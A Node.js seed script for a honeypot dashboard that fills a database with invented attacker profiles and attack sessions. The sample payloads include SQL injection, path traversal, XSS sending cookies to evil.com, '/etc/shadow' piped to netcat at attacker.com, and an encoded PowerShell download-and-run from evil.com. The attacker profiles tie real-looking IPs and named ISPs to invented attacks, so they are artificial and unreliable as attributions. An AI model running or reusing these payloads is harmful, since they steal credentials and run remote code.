// seed-stories.js — Direct DB seeder for rich Attack Stories
const { PrismaClient } = require('@prisma/client');
const crypto = require('crypto');

const prisma = new PrismaClient();

const attackers = [
  {
    ip: '194.26.29.104',
    country: 'Russia',
    city: 'Moscow',
    lat: 55.7558,
    lon: 37.6173,
    organization: 'Rostelecom',
    isProxy: false,
    tags: 'Dangerous, Persistent, SQLi Specialist'
  },
  {
    ip: '91.222.174.83',
    country: 'Ukraine',
    city: 'Kyiv',
    lat: 50.4501,
    lon: 30.5234,
    organization: 'Ukrtelecom',
    isProxy: true,
    tags: 'Script Kiddie, XSS Attempt, VPN Rotation'
  },
  {
    ip: '185.15.58.220',
    country: 'Germany',
    city: 'Frankfurt',
    lat: 50.1109,
    lon: 8.6821,
    organization: 'Hetzner Online GmbH',
    isProxy: false,
    tags: 'Dangerous, Command Injection, Brute Force'
  },
  {
    ip: '103.44.234.11',
    country: 'China',
    city: 'Shanghai',
    lat: 31.2304,
    lon: 121.4737,
    organization: 'China Telecom',
    isProxy: true,
    tags: 'Dangerous, API Exploitation, VPN Rotation'
  },
  {
    ip: '45.133.1.97',
    country: 'Netherlands',
    city: 'Amsterdam',
    lat: 52.3676,
    lon: 4.9041,
    organization: 'ColoCrossing BV',
    isProxy: true,
    tags: 'Explorer, Recon Scanner, VPN Rotation'
  },
  {
    ip: '177.54.151.62',
    country: 'Brazil',
    city: 'São Paulo',
    lat: -23.5505,
    lon: -46.6333,
    organization: 'Vivo Telecom',
    isProxy: false,
    tags: 'Script Kiddie, Directory Traversal'
  },
  {
    ip: '41.215.241.73',
    country: 'Nigeria',
    city: 'Lagos',
    lat: 6.5244,
    lon: 3.3792,
    organization: 'MainOne Cable',
    isProxy: false,
    tags: 'Dangerous, Credential Stuffing, Brute Force'
  },
  {
    ip: '112.55.33.198',
    country: 'South Korea',
    city: 'Seoul',
    lat: 37.5665,
    lon: 126.9780,
    organization: 'Korea Telecom',
    isProxy: false,
    tags: 'Script Kiddie, SSH Probing'
  },
  {
    ip: '89.163.224.15',
    country: 'Romania',
    city: 'Bucharest',
    lat: 44.4268,
    lon: 26.1025,
    organization: 'M247 Ltd',
    isProxy: true,
    tags: 'Dangerous, Ransomware Dropper, VPN Rotation'
  },
  {
    ip: '203.99.12.44',
    country: 'India',
    city: 'Mumbai',
    lat: 19.0760,
    lon: 72.8777,
    organization: 'Tata Communications',
    isProxy: false,
    tags: 'Explorer, Automated Scanner'
  }
];

// Each session template: a series of payloads representing a multi-stage attack story
const sessionTemplates = [
  // Russia — Classic SQLi Campaign
  {
    attackerIdx: 0,
    tarpitLevel: 4,
    totalWastedTimeSec: 128,
    payloads: [
      { surface: 'login', method: 'GET', endpoint: '/login', body: '{}', matchedRules: '[]', threatScore: 15, severity: 'Low' },
      { surface: 'api', method: 'GET', endpoint: '/api/v1/users', body: '{}', matchedRules: '["API Scanning"]', threatScore: 35, severity: 'Medium' },
      { surface: 'login', method: 'POST', endpoint: '/login', body: '{"username":"admin","password":"\\u0027 OR 1=1 --"}', matchedRules: '["SQLi","Authentication Bypass"]', threatScore: 92, severity: 'Critical' },
      { surface: 'api', method: 'GET', endpoint: '/api/v1/users?id=1 UNION SELECT * FROM config--', body: '{}', matchedRules: '["SQLi","Data Exfiltration"]', threatScore: 98, severity: 'Critical' },
      { surface: 'admin', method: 'GET', endpoint: '/admin/settings', body: '{}', matchedRules: '["Privilege Escalation"]', threatScore: 85, severity: 'High' },
      { surface: 'files', method: 'GET', endpoint: '/files/../../../etc/passwd', body: '{}', matchedRules: '["Path Traversal","Directory Traversal"]', threatScore: 90, severity: 'Critical' }
    ]
  },
  // Ukraine — XSS + Session Hijacking
  {
    attackerIdx: 1,
    tarpitLevel: 3,
    totalWastedTimeSec: 96,
    payloads: [
      { surface: 'login', method: 'GET', endpoint: '/login', body: '{}', matchedRules: '[]', threatScore: 10, severity: 'Low' },
      { surface: 'login', method: 'POST', endpoint: '/login', body: '{"username":"<script>document.location=\\"http://evil.com/steal?c=\\"+document.cookie</script>","password":"test"}', matchedRules: '["XSS","Cookie Theft"]', threatScore: 88, severity: 'High' },
      { surface: 'api', method: 'POST', endpoint: '/api/v1/comments', body: '{"text":"<img src=x onerror=alert(1)>"}', matchedRules: '["XSS","Stored XSS"]', threatScore: 82, severity: 'High' },
      { surface: 'api', method: 'GET', endpoint: '/api/v1/session?token=stolen_xyz', body: '{}', matchedRules: '["Session Hijacking"]', threatScore: 90, severity: 'Critical' },
      { surface: 'admin', method: 'GET', endpoint: '/admin/dashboard', body: '{}', matchedRules: '["Privilege Escalation"]', threatScore: 78, severity: 'High' }
    ]
  },
  // Germany — Command Injection + RCE
  {
    attackerIdx: 2,
    tarpitLevel: 5,
    totalWastedTimeSec: 185,
    payloads: [
      { surface: 'api', method: 'GET', endpoint: '/api/v1/health', body: '{}', matchedRules: '[]', threatScore: 5, severity: 'Low' },
      { surface: 'api', method: 'GET', endpoint: '/api/v1/users', body: '{}', matchedRules: '["API Scanning"]', threatScore: 30, severity: 'Medium' },
      { surface: 'login', method: 'POST', endpoint: '/login', body: '{"username":"root","password":"toor"}', matchedRules: '["Brute Force","Default Credentials"]', threatScore: 65, severity: 'High' },
      { surface: 'api', method: 'POST', endpoint: '/api/v1/exec', body: '{"cmd":"cat /etc/shadow | nc attacker.com 9001"}', matchedRules: '["Command Injection","RCE","Data Exfiltration"]', threatScore: 99, severity: 'Critical' },
      { surface: 'ssh', method: 'POST', endpoint: '/ssh/connect', body: '{"host":"internal-db","user":"root"}', matchedRules: '["Lateral Movement","SSH Brute Force"]', threatScore: 95, severity: 'Critical' },
      { surface: 'files', method: 'GET', endpoint: '/files/backup.sql', body: '{}', matchedRules: '["Sensitive File Access"]', threatScore: 75, severity: 'High' },
      { surface: 'api', method: 'POST', endpoint: '/api/v1/upload', body: '{"file":"shell.php"}', matchedRules: '["Web Shell Upload","RCE"]', threatScore: 97, severity: 'Critical' }
    ]
  },
  // China — API Exploitation Campaign
  {
    attackerIdx: 3,
    tarpitLevel: 3,
    totalWastedTimeSec: 112,
    payloads: [
      { surface: 'api', method: 'GET', endpoint: '/api/v1/docs', body: '{}', matchedRules: '[]', threatScore: 8, severity: 'Low' },
      { surface: 'api', method: 'GET', endpoint: '/api/v1/users?limit=99999', body: '{}', matchedRules: '["API Abuse","Rate Limit Bypass"]', threatScore: 55, severity: 'Medium' },
      { surface: 'api', method: 'POST', endpoint: '/api/v1/graphql', body: '{"query":"{ __schema { types { name } } }"}', matchedRules: '["GraphQL Introspection","Schema Leak"]', threatScore: 72, severity: 'High' },
      { surface: 'api', method: 'POST', endpoint: '/api/v1/auth/token', body: '{"grant_type":"client_credentials","client_id":"*"}', matchedRules: '["OAuth Exploitation","Token Forgery"]', threatScore: 88, severity: 'Critical' },
      { surface: 'api', method: 'DELETE', endpoint: '/api/v1/users/1', body: '{}', matchedRules: '["IDOR","Privilege Escalation","Destructive Action"]', threatScore: 95, severity: 'Critical' }
    ]
  },
  // Netherlands — Recon Sweep
  {
    attackerIdx: 4,
    tarpitLevel: 2,
    totalWastedTimeSec: 64,
    payloads: [
      { surface: 'unknown', method: 'GET', endpoint: '/.env', body: '{}', matchedRules: '["Sensitive File Access"]', threatScore: 60, severity: 'Medium' },
      { surface: 'unknown', method: 'GET', endpoint: '/wp-admin', body: '{}', matchedRules: '["CMS Detection"]', threatScore: 25, severity: 'Low' },
      { surface: 'unknown', method: 'GET', endpoint: '/phpmyadmin', body: '{}', matchedRules: '["Admin Panel Scan"]', threatScore: 35, severity: 'Medium' },
      { surface: 'api', method: 'GET', endpoint: '/api/v1/config', body: '{}', matchedRules: '["Configuration Leak"]', threatScore: 50, severity: 'Medium' },
      { surface: 'unknown', method: 'GET', endpoint: '/robots.txt', body: '{}', matchedRules: '[]', threatScore: 5, severity: 'Low' },
      { surface: 'ssh', method: 'GET', endpoint: '/ssh/keys', body: '{}', matchedRules: '["SSH Key Discovery"]', threatScore: 68, severity: 'High' }
    ]
  },
  // Brazil — Directory Traversal + Data Theft
  {
    attackerIdx: 5,
    tarpitLevel: 3,
    totalWastedTimeSec: 78,
    payloads: [
      { surface: 'files', method: 'GET', endpoint: '/files/', body: '{}', matchedRules: '["Directory Listing"]', threatScore: 30, severity: 'Low' },
      { surface: 'files', method: 'GET', endpoint: '/files/../../etc/passwd', body: '{}', matchedRules: '["Path Traversal","Directory Traversal"]', threatScore: 85, severity: 'High' },
      { surface: 'files', method: 'GET', endpoint: '/files/../../var/log/auth.log', body: '{}', matchedRules: '["Path Traversal","Log Access"]', threatScore: 80, severity: 'High' },
      { surface: 'files', method: 'GET', endpoint: '/files/backup.sql', body: '{}', matchedRules: '["Sensitive File Access","Data Exfiltration"]', threatScore: 90, severity: 'Critical' }
    ]
  },
  // Nigeria — Credential Stuffing
  {
    attackerIdx: 6,
    tarpitLevel: 4,
    totalWastedTimeSec: 145,
    payloads: [
      { surface: 'login', method: 'POST', endpoint: '/login', body: '{"username":"admin","password":"admin123"}', matchedRules: '["Brute Force"]', threatScore: 45, severity: 'Medium' },
      { surface: 'login', method: 'POST', endpoint: '/login', body: '{"username":"admin","password":"password1"}', matchedRules: '["Brute Force","Credential Stuffing"]', threatScore: 55, severity: 'Medium' },
      { surface: 'login', method: 'POST', endpoint: '/login', body: '{"username":"root","password":"toor"}', matchedRules: '["Brute Force","Default Credentials"]', threatScore: 65, severity: 'High' },
      { surface: 'login', method: 'POST', endpoint: '/login', body: '{"username":"administrator","password":"P@ssw0rd!"}', matchedRules: '["Brute Force","Credential Stuffing"]', threatScore: 70, severity: 'High' },
      { surface: 'login', method: 'POST', endpoint: '/login', body: '{"username":"sa","password":"\\u0027 OR 1=1; DROP TABLE users;--"}', matchedRules: '["SQLi","Brute Force","Destructive Action"]', threatScore: 98, severity: 'Critical' }
    ]
  },
  // South Korea — SSH Probing
  {
    attackerIdx: 7,
    tarpitLevel: 2,
    totalWastedTimeSec: 52,
    payloads: [
      { surface: 'ssh', method: 'GET', endpoint: '/ssh', body: '{}', matchedRules: '[]', threatScore: 10, severity: 'Low' },
      { surface: 'ssh', method: 'GET', endpoint: '/ssh/keys', body: '{}', matchedRules: '["SSH Key Discovery"]', threatScore: 55, severity: 'Medium' },
      { surface: 'ssh', method: 'POST', endpoint: '/ssh/connect', body: '{"user":"root","host":"0.0.0.0"}', matchedRules: '["SSH Brute Force"]', threatScore: 72, severity: 'High' },
      { surface: 'ssh', method: 'POST', endpoint: '/ssh/tunnel', body: '{"forward":"internal-db:3306"}', matchedRules: '["SSH Tunneling","Lateral Movement"]', threatScore: 85, severity: 'Critical' }
    ]
  },
  // Romania — Ransomware Dropper
  {
    attackerIdx: 8,
    tarpitLevel: 5,
    totalWastedTimeSec: 220,
    payloads: [
      { surface: 'api', method: 'GET', endpoint: '/api/v1/health', body: '{}', matchedRules: '[]', threatScore: 5, severity: 'Low' },
      { surface: 'login', method: 'POST', endpoint: '/login', body: '{"username":"admin","password":"admin"}', matchedRules: '["Brute Force","Default Credentials"]', threatScore: 60, severity: 'High' },
      { surface: 'api', method: 'POST', endpoint: '/api/v1/upload', body: '{"file":"payload.exe","type":"binary"}', matchedRules: '["Malware Upload","Ransomware"]', threatScore: 99, severity: 'Critical' },
      { surface: 'api', method: 'POST', endpoint: '/api/v1/exec', body: '{"cmd":"powershell -enc SQBFAFgAIAAoACAAaQB3AHIAIABoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHIAYQBuAHMAbwBtAC4AcABzADEAKQA="}', matchedRules: '["Command Injection","PowerShell Exploitation","Ransomware"]', threatScore: 100, severity: 'Critical' },
      { surface: 'files', method: 'DELETE', endpoint: '/files/backup.sql', body: '{}', matchedRules: '["Destructive Action","Data Destruction"]', threatScore: 98, severity: 'Critical' },
      { surface: 'api', method: 'POST', endpoint: '/api/v1/broadcast', body: '{"message":"YOUR FILES HAVE BEEN ENCRYPTED"}', matchedRules: '["Ransomware","Extortion"]', threatScore: 100, severity: 'Critical' }
    ]
  },
  // India — Automated Scanner
  {
    attackerIdx: 9,
    tarpitLevel: 1,
    totalWastedTimeSec: 30,
    payloads: [
      { surface: 'unknown', method: 'GET', endpoint: '/', body: '{}', matchedRules: '[]', threatScore: 5, severity: 'Low' },
      { surface: 'login', method: 'GET', endpoint: '/login', body: '{}', matchedRules: '[]', threatScore: 8, severity: 'Low' },
      { surface: 'admin', method: 'GET', endpoint: '/admin', body: '{}', matchedRules: '["Admin Panel Scan"]', threatScore: 35, severity: 'Medium' },
      { surface: 'api', method: 'GET', endpoint: '/api/v1/users', body: '{}', matchedRules: '["API Scanning"]', threatScore: 30, severity: 'Medium' }
    ]
  }
];

const aiInsightTemplates = {
  'SQLi': {
    explanation: 'This payload contains a classic SQL injection attack vector using a tautology-based bypass technique. The attacker injects a conditional statement that always evaluates to true, attempting to circumvent authentication logic.',
    intention: 'The attacker is attempting to bypass authentication mechanisms and extract sensitive data from the backend database by manipulating SQL queries through unsanitized user input fields.',
    danger: 'On an unprotected system, this attack could grant full administrative access, expose all user credentials, and allow the attacker to exfiltrate, modify, or delete entire database tables.',
    recommendation: 'Implement parameterized queries or prepared statements. Use an ORM layer to abstract SQL logic. Apply input validation and sanitization on all user-facing fields. Enable WAF rules for SQL pattern detection.'
  },
  'XSS': {
    explanation: 'This payload contains a Cross-Site Scripting (XSS) attack that injects malicious JavaScript into user input fields. The script attempts to execute in the context of other users\' browser sessions.',
    intention: 'The attacker is attempting to steal session cookies, redirect users to phishing pages, or inject persistent malicious scripts that execute whenever a victim views the compromised page content.',
    danger: 'A successful XSS attack can lead to complete account takeover, session hijacking, defacement of the web application, and distribution of malware to all users who visit the affected pages.',
    recommendation: 'Implement Content Security Policy (CSP) headers. Sanitize all user inputs using libraries like DOMPurify. Use HttpOnly and Secure flags on session cookies. Encode output in HTML contexts.'
  },
  'Command Injection': {
    explanation: 'This payload contains a direct operating system command injection attempt. The attacker is trying to execute arbitrary system commands through application input fields that interact with the OS shell.',
    intention: 'The attacker seeks to achieve Remote Code Execution (RCE) to gain shell access on the server, exfiltrate sensitive files, establish persistent backdoors, or pivot to internal network resources.',
    danger: 'This is an extremely critical threat. Successful command injection provides the attacker with full control over the server, enabling data theft, ransomware deployment, and lateral movement across the network.',
    recommendation: 'Never pass user input directly to system commands. Use allowlists for permitted operations. Implement sandboxing for any process execution. Deploy runtime application security monitoring (RASP).'
  },
  'Brute Force': {
    explanation: 'This payload is part of an automated credential stuffing campaign using commonly leaked username-password combinations. The attacker is systematically testing credentials across the authentication endpoint.',
    intention: 'The attacker aims to find valid credentials through exhaustive trial of known breached password lists, targeting accounts with weak or reused passwords across multiple services.',
    danger: 'If successful, the attacker gains legitimate access to user accounts, enabling data theft, account manipulation, and potential privilege escalation to administrative roles within the application.',
    recommendation: 'Implement account lockout policies after failed attempts. Deploy CAPTCHA challenges. Use multi-factor authentication. Monitor for anomalous login patterns and implement rate limiting per IP.'
  },
  'Path Traversal': {
    explanation: 'This payload employs directory traversal sequences (../) to escape the web root directory and access sensitive system files that should not be publicly accessible through the web server.',
    intention: 'The attacker is attempting to read critical system files such as /etc/passwd, configuration files, or application source code to gather intelligence for further exploitation of the target.',
    danger: 'Successful path traversal can expose sensitive system configurations, user credentials, database connection strings, and application secrets that enable more devastating follow-up attacks.',
    recommendation: 'Implement strict path validation and canonicalization. Use chroot jails or containerization. Set proper file permissions. Use a Web Application Firewall to detect traversal patterns.'
  },
  'default': {
    explanation: 'The honeypot system detected suspicious activity patterns from this source. The request exhibits characteristics consistent with automated scanning tools or manual probing of system defenses.',
    intention: 'The entity is performing reconnaissance to identify exploitable services, open ports, vulnerable endpoints, and application architecture details for potential future exploitation campaigns.',
    danger: 'While individual reconnaissance activities may seem low-risk, they serve as precursors to targeted attacks. Information gathered during this phase directly enables more sophisticated exploitation.',
    recommendation: 'Monitor and log all reconnaissance activity. Implement rate limiting and behavioral analysis. Use honeytokens to detect early-stage intrusion attempts. Block repeat offenders at the network level.'
  }
};

function getInsightForRules(rules) {
  const parsed = JSON.parse(rules || '[]');
  if (parsed.includes('SQLi') || parsed.includes('Authentication Bypass')) return aiInsightTemplates['SQLi'];
  if (parsed.includes('XSS') || parsed.includes('Stored XSS') || parsed.includes('Cookie Theft')) return aiInsightTemplates['XSS'];
  if (parsed.includes('Command Injection') || parsed.includes('RCE')) return aiInsightTemplates['Command Injection'];
  if (parsed.includes('Brute Force') || parsed.includes('Credential Stuffing')) return aiInsightTemplates['Brute Force'];
  if (parsed.includes('Path Traversal') || parsed.includes('Directory Traversal')) return aiInsightTemplates['Path Traversal'];
  return aiInsightTemplates['default'];
}

async function seed() {
  console.log("==========================================");
  console.log("   CHAKRAVYUH ATTACK STORIES SEEDER      ");
  console.log("==========================================\n");

  // Clear existing data
  console.log("Clearing existing data...");
  await prisma.aIInsight.deleteMany();
  await prisma.payload.deleteMany();
  await prisma.attackSession.deleteMany();
  await prisma.attackerProfile.deleteMany();
  console.log("Database cleared.\n");

  for (const template of sessionTemplates) {
    const attackerData = attackers[template.attackerIdx];
    const fingerprint = crypto.createHash('sha256').update(attackerData.ip + 'Mozilla/5.0').digest('hex');

    console.log(`Creating attacker: ${attackerData.ip} (${attackerData.country})...`);
    
    const profile = await prisma.attackerProfile.create({
      data: {
        fingerprint,
        ip: attackerData.ip,
        country: attackerData.country,
        city: attackerData.city,
        latitude: attackerData.lat,
        longitude: attackerData.lon,
        organization: attackerData.organization,
        isProxy: attackerData.isProxy,
        tags: attackerData.tags
      }
    });

    // Create session with staggered timestamps
    const baseTime = new Date(Date.now() - Math.floor(Math.random() * 3600000)); // within last hour
    
    const session = await prisma.attackSession.create({
      data: {
        attackerId: profile.id,
        startTime: baseTime,
        tarpitLevel: template.tarpitLevel,
        totalWastedTimeSec: template.totalWastedTimeSec
      }
    });

    console.log(`  Session: ${session.id.substring(0,8)}... (${template.payloads.length} payloads)`);

    for (let i = 0; i < template.payloads.length; i++) {
      const p = template.payloads[i];
      const timestamp = new Date(baseTime.getTime() + (i * (3000 + Math.random() * 8000))); // 3-11s between payloads

      const payload = await prisma.payload.create({
        data: {
          sessionId: session.id,
          surface: p.surface,
          method: p.method,
          endpoint: p.endpoint,
          body: p.body,
          headers: JSON.stringify({ 'user-agent': 'sqlmap/1.5', 'x-forwarded-for': attackerData.ip }),
          matchedRules: p.matchedRules,
          threatScore: p.threatScore,
          severity: p.severity,
          timestamp
        }
      });

      // Add AI insight for high-severity payloads
      if (p.threatScore > 40) {
        const insight = getInsightForRules(p.matchedRules);
        const payloadHash = crypto.createHash('sha256').update(payload.id + p.matchedRules).digest('hex');
        
        await prisma.aIInsight.create({
          data: {
            payloadId: payload.id,
            payloadHash,
            explanation: insight.explanation,
            intention: insight.intention,
            danger: insight.danger,
            recommendation: insight.recommendation
          }
        });
      }
    }

    console.log(`  ✓ Done: ${attackerData.country} — ${template.payloads.length} payloads seeded`);
  }

  const totalPayloads = await prisma.payload.count();
  const totalSessions = await prisma.attackSession.count();
  const totalProfiles = await prisma.attackerProfile.count();
  const totalInsights = await prisma.aIInsight.count();

  console.log("\n==========================================");
  console.log("  SEEDING COMPLETE!");
  console.log(`  Attacker Profiles: ${totalProfiles}`);
  console.log(`  Attack Sessions:   ${totalSessions}`);
  console.log(`  Total Payloads:    ${totalPayloads}`);
  console.log(`  AI Insights:       ${totalInsights}`);
  console.log("==========================================\n");

  await prisma.$disconnect();
}

seed().catch(e => {
  console.error("Seed error:", e);
  prisma.$disconnect();
  process.exit(1);
});
